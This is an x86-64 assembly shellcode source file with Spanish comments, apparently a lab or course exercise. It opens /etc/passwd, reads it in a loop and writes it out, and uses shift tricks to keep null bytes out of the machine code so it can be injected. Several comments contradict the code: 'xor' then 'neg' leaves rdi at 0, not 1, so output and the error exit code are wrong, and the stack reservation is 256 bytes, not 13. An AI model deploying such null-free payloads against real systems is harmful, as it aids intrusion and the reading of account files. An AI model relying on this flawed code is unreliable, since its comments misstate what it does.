# Compilar y enlazar:
# as -o shellcode.o shellcode.s
# ld -o shellcode shellcode.o


.global _start

.text

_start:


    # 2 REGISTROS:

    mov $0x100fffffffffffff, %r8   # Espacio en pila para /etc/passwd = 13
    shr $52, %r8
    sub %r8, %rsp                  # Actualizo puntero 

    mov $0x2f2f2f2f6374652f, %r9   # %r9 = ////cte/
    mov $0x6477737361702fff, %r10  # %r10 = dwssap 
    shr $8, %r10                   # %r10 = 0\dwssap
    push %r10                      # Ultimo en salir
    push %r9                       # Primero en salir


    # OPEN /etc/passwd:
    mov $0x2fffffffffffffff, %rax  
    shr $60,%rax                    # rax = 2 
    mov %rsp, %rdi                  # rdi = /etc/passwd
    
    mov $0x1a4fffffffffffff, %rsi   
    shr $52, %rsi                   # rsi = 0644
    xor %rdx, %rdx                  # rdx = lectura = 0
    syscall

    mov %rax, %r8                   # r8 = rax = fd
    xor %r10,%r10                   # Evito 0s con %r10 = 0 
    cmp %r10, %r8                     
    jl error                        # Si r8 < 0 -> error

    mov $0x400fffffffffffff, %r11   # Espacio de 1024 en pila para buffer
    shr $52,%r11                    # %r11 = 1024
    sub %r11, %rsp                  # Actualizo pila 

        
loop:                       
    # BUCLE


    # READ /etc/passwd:     
    xor %rax, %rax                  # rax = 0
    mov %r8, %rdi                   # rdi = fd
    mov %rsp, %rsi                  # rsi = buffer
    mov $0x400fffffffffffff, %rdx   # rdx = 1024        
    shr $52,%rdx
    syscall 

    mov %rax, %r9                   # r9 = rax = nr (leído)
    cmp %r10, %r9                   # Si devuelvo -1 error.
    jl error                        # Si %r9 < 0 -> error 

    
    # WRITE
    mov $0x1fffffffffffffff, %rax   # rax = 1
    shr $60, %rax           
    xor  %rdi, %rdi                 
    neg   %rdi                      # rdi = 1 (stdout)
    mov   %rsp, %rsi                # rsi = buffer
    mov   %r9, %rdx                 # rdx = nr (leído) = r9
    syscall           
   
    

	cmp %r10, %r9                   # Condición de bucle. Paro cuando haya leído todo.
    ja loop                         # Si r9 > 0 -> loop

    
    # FIN BUCLE

    # EXIT:
    mov	$0x3cffffffffffffff, %rax   
    shr $56,%rax                    # rax = 60
    xor %rdi, %rdi                  # code = 0   
    syscall



error:

    mov	$0x3cffffffffffffff, %rax   # rax = 60
    shr $56,%rax
    xor	%rdi, %rdi                  
    neg %rdi                        # code = 1
    syscall

